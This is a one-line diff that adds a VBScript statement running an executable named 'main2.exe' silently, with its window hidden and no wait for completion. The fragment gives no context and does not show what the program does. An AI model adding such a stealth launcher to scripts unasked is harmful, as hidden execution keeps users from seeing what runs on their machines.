@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "main2.exe" , 0, False
